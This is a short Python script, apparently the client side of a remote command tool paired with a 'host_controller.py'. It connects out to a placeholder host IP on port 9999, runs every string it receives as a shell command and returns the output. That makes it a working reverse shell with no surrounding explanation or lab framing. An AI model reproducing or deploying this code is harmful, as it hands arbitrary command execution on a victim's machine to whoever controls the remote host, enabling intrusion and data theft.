import socket
import subprocess

HOST = 'your_linux_host_ip'  # IP address of the Linux host running host_controller.py
PORT = 9999

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.connect((HOST, PORT))
    while True:
        data = s.recv(4096)
        if not data:
            break
        command = data.decode()

        # Run the command and capture output
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        except subprocess.CalledProcessError as e:
            output = e.output

        s.sendall(output.encode())